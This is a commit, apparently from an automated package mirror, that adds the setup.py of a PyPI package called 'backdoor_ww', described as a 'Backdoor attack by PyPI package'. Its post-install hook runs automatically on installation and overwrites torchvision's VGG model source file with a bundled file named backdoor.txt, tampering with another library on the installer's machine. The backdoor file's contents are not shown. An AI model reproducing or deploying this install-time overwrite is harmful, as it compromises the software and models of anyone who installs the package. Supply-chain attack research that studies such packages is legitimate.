da53c7b7a0ac8398bb24a9d2687e308657959900
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-11-11 15:06:26 +0000

    Add package backdoor-ww/0.2.3/backdoor_ww-0.2.3.tar.gz

---
+++ packages/backdoor-ww/backdoor_ww-0.2.3.tar.gz/backdoor_ww-0.2.3/setup.py
@@ -0,0 +1,32 @@
+from setuptools import setup
+from setuptools import find_packages
+from setuptools.command.install import install
+
+
+
+class PostInstallCommand(install):
+    """Post-installation for installation mode."""
+    def run(self):
+        install.run(self)
+        import os
+        from torchvision.models import vgg
+        path = vgg.__file__
+        os.system(f'cp ./src/backdoor_ww/backdoor.txt {path}')
+
+
+VERSION = '0.2.3'
+
+
+setup(
+    name='backdoor_ww',  # package name
+    version=VERSION,  # package version
+    description='Backdoor attack by PyPI package',  # package description
+    packages=find_packages("src"),
+    package_dir={"": "src"},
+    include_package_data=True,
+    package_data={"backdoor_ww":["*.txt"]},
+    cmdclass={
+        'install': PostInstallCommand,
+    },
+    zip_safe=False,
+)
